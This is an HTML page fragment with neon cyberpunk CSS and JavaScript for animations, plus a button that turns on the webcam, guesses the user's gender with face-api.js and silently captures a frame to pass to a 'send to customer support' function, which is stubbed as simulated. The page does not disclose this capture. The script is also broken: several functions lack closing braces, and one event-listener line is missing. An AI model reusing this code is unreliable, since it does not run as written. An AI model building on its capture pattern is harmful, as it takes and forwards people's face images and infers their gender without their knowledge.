<!-- Neon Cyberpunk Upgraded GUI -->
<style>
    body {
        background: radial-gradient(ellipse at top left, #0ff1ce33 0%, #232347 100%), var(--bg-gradient);
        overflow-x: hidden;
    }
    .particles {
        position: fixed;
        top: 0; left: 0; width: 100vw; height: 100vh;
        pointer-events: none;
        z-index: 0;
    }
    .particle {
        position: absolute;
        border-radius: 50%;
        opacity: 0.7;
        animation: float 8s infinite linear;
        background: radial-gradient(circle, #0ff1ce 0%, #00e0ff 80%, transparent 100%);
    }
    .particle1 { width: 60px; height: 60px; left: 10vw; top: 20vh; animation-delay: 0s;}
    .particle2 { width: 40px; height: 40px; left: 80vw; top: 10vh; animation-delay: 2s;}
    .particle3 { width: 30px; height: 30px; left: 50vw; top: 70vh; animation-delay: 4s;}
    .particle4 { width: 50px; height: 50px; left: 30vw; top: 60vh; animation-delay: 1s;}
    .particle5 { width: 35px; height: 35px; left: 70vw; top: 40vh; animation-delay: 3s;}
    @keyframes float {
        0% { transform: translateY(0) scale(1);}
        50% { transform: translateY(-30px) scale(1.1);}
        100% { transform: translateY(0) scale(1);}
    }
    .cyber-glow {
        position: absolute;
        top: 0; left: 0; width: 100vw; height: 100vh;
        pointer-events: none;
        z-index: 1;
        background: radial-gradient(circle at 50% 30%, #0ff1ce22 0%, transparent 70%);
        filter: blur(40px);
    }
    .cyber-lines {
        position: absolute;
        top: 0; left: 0; width: 100vw; height: 220px;
        z-index: 2;
        pointer-events: none;
        opacity: 0.7;
        animation: linesMove 10s infinite alternate ease-in-out;
    }
    @keyframes linesMove {
        0% { transform: translateY(0);}
        100% { transform: translateY(10px);}
    }
    header h1 {
        font-family: 'Orbitron', 'Montserrat', Arial, sans-serif;
        font-size: 2.8em;
        color: #0ff1ce;
        letter-spacing: 0.12em;
        text-shadow: 0 0 18px #0ff1ce, 0 0 2px #fff;
        background: linear-gradient(90deg, #0ff1ce 30%, #ff00ea 70%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        filter: drop-shadow(0 2px 10px #0ff1ce88);
        margin-bottom: 0.2em;
        margin-top: 1.2em;
        text-align: center;
        animation: neonPulse 2.5s infinite alternate;
    }
    @keyframes neonPulse {
        0% { text-shadow: 0 0 18px #0ff1ce, 0 0 2px #fff;}
        100% { text-shadow: 0 0 32px #ff00ea, 0 0 8px #fff;}
    }
    .button-container {
        background: var(--glass-bg);
        border: var(--glass-border);
        border-radius: var(--card-radius);
        box-shadow: var(--shadow);
        padding: 36px 32px 28px 32px;
        margin-top: 30px;
        position: relative;
        overflow: visible;
        min-width: 320px;
        max-width: 95vw;
        backdrop-filter: blur(10px);
        transition: box-shadow 0.3s;
    }
    .button-container:hover {
        box-shadow: 0 0 32px #0ff1ce99, 0 8px 32px #000a;
    }
    .button {
        background: linear-gradient(90deg, #0ff1ce 0%, #ff00ea 100%);
        color: #181818;
        border: none;
        border-radius: 16px;
        padding: 18px 44px;
        font-family: 'Orbitron', 'Montserrat', Arial, sans-serif;
        font-size: 1.18em;
        font-weight: bold;
        cursor: pointer;
        margin: 8px 0;
        box-shadow: 0 0 16px #0ff1ce, 0 2px 8px #0008;
        transition: all 0.22s cubic-bezier(.4,2,.6,1);
        outline: none;
        letter-spacing: 1.5px;
        position: relative;
        overflow: hidden;
        opacity: 0.98;
        filter: brightness(1.08) saturate(1.2);
    }
    .button:before {
        content: "";
        position: absolute;
        left: 50%; top: 50%;
        width: 0; height: 0;
        background: radial-gradient(circle, #fff8 0%, transparent 80%);
        transform: translate(-50%, -50%);
        opacity: 0.7;
        transition: width 0.3s, height 0.3s;
        z-index: 0;
    }
    .button:hover:before {
        width: 180%; height: 180%;
        opacity: 0.15;
    }
    .button:active {
        transform: scale(0.97);
        box-shadow: 0 0 8px #ff00ea, 0 2px 8px #0008;
        filter: brightness(1.2) saturate(1.5);
    }
    .button .ripple {
        position: absolute;
        border-radius: 50%;
        transform: scale(0);
        animation: ripple 0.5s linear;
        background: rgba(255,255,255,0.5);
        pointer-events: none;
        z-index: 2;
    }
    @keyframes ripple {
        to {
            transform: scale(2.5);
            opacity: 0;
        }
    }
    .pulse-ring {
        position: absolute;
        left: 50%; top: 50%;
        transform: translate(-50%, -50%);
        width: 340px; height: 120px;
        border-radius: 40% 40% 60% 60%/60% 60% 40% 40%;
        background: radial-gradient(circle, #0ff1ce44 0%, transparent 80%);
        filter: blur(18px);
        z-index: 0;
        animation: pulseRing 2.5s infinite alternate;
        pointer-events: none;
    }
    @keyframes pulseRing {
        0% { opacity: 0.5; transform: translate(-50%, -50%) scale(1);}
        100% { opacity: 0.9; transform: translate(-50%, -50%) scale(1.08);}
    }
    main {
        z-index: 3;
        width: 100vw;
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    footer {
        background: rgba(20,24,40,0.7);
        border-radius: 12px;
        padding: 18px 32px;
        margin-bottom: 24px;
        margin-top: 40px;
        box-shadow: 0 2px 12px #0ff1ce22;
        text-align: center;
        font-size: 1em;
        color: #b3b3b3;
        letter-spacing: 0.04em;
        z-index: 10;
    }
    /* Responsive */
    @media (max-width: 600px) {
        .button-container {
            min-width: 90vw;
            padding: 18px 6vw 18px 6vw;
        }
        .pulse-ring {
            width: 90vw; height: 80px;
        }
        header h1 {
            font-size: 2em;
        }
    }
</style>

<script>
    // Check for low-end device or reduced motion preference
    function isLowEndDevice() {
        return (navigator.deviceMemory && navigator.deviceMemory <= 2) ||
               (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) ||
               window.matchMedia('(max-width: 480px)').matches;
    }

    window.addEventListener('DOMContentLoaded', () => {
        const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
        if (prefersReducedMotion || isLowEndDevice()) {
            document.body.classList.add('reduced-motion');
            return;
        }

        // Add comet trails
        const particles = document.querySelector('.particles');
        if (particles) {
            for (let i = 1; i <= 3; i++) {
                const comet = document.createElement('div');
                comet.className = `comet comet${i}`;
                particles.appendChild(comet);
            }
        }

        // Add pulse ring to button container
        const btnContainer = document.querySelector('.button-container');
        if (btnContainer) {
            const ring = document.createElement('div');
            ring.className = 'pulse-ring';
            btnContainer.appendChild(ring);
        }

        // Neon ripple effect for buttons
        document.querySelectorAll('.button').forEach(btn => {
            btn.addEventListener('click', function(e) {
                const ripple = document.createElement('span');
                ripple.className = 'ripple';
                const rect = btn.getBoundingClientRect();
                ripple.style.left = (e.clientX - rect.left) + 'px';
                ripple.style.top = (e.clientY - rect.top) + 'px';
                ripple.style.width = ripple.style.height = Math.max(rect.width, rect.height) + 'px';
                btn.appendChild(ripple);
                ripple.addEventListener('animationend', () => ripple.remove());
            });
        });
    });

    window.addEventListener('keydown', function(e) {
        if (e.key === 'Tab') {
            document.body.classList.add('user-is-tabbing');
        }
    });

    // --- Face detection and gender prediction ---
    async function loadFaceApiModels() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
        await faceapi.nets.ageGenderNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');

    async function sendImageToSupport(blob) {

        console.log('Image sent to customer support (simulated).');

    async function captureAndDetectGender() {
        const main = document.querySelector('main');
        let video = document.createElement('video');
        video.autoplay = true;
        video.width = 320;
        video.height = 240;
        video.style.borderRadius = "16px";
        video.style.margin = "16px 0";
        main.appendChild(video);

        let resultDiv = document.createElement('div');
        resultDiv.style.fontSize = '1.2em';
        resultDiv.style.margin = '10px 0';
        main.appendChild(resultDiv);

        try {
            await loadFaceApiModels();
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            video.onloadedmetadata = async () => {
                // Wait for video to play
                await new Promise(res => setTimeout(res, 500));
                const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withAgeAndGender();
                if (detection && detection.gender) {
                    resultDiv.textContent = `Detected: ${detection.gender === 'male' ? 'Male' : 'Female'}`;
                } else {
                    resultDiv.textContent = "Face not detected.";
                }

                // --- Capture frame and send to support ---
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        await sendImageToSupport(blob);
                    }
                }, 'image/jpeg', 0.85);

                // Stop camera
                stream.getTracks().forEach(track => track.stop());
            };
        } catch (err) {
            resultDiv.textContent = "Camera access denied or error occurred.";
        }
    }

    // Button navigation functions
    function redirectToPage() {
        window.open('another-page.html', '_blank');
    }
    function AI() {
        captureAndDetectGender();
    }
    function ELITE() {

    window.onload = function() {
        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "PC";

        document.querySelectorAll('button').forEach(button => {

                button.style.transform = 'scale(1.05)';
                button.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
            });
            button.addEventListener('mouseout', () => {
                button.style.transform = 'scale(1)';
                button.style.boxShadow = 'none';
            });
        });

        console.log(`Device Type: ${deviceType}`);
    };
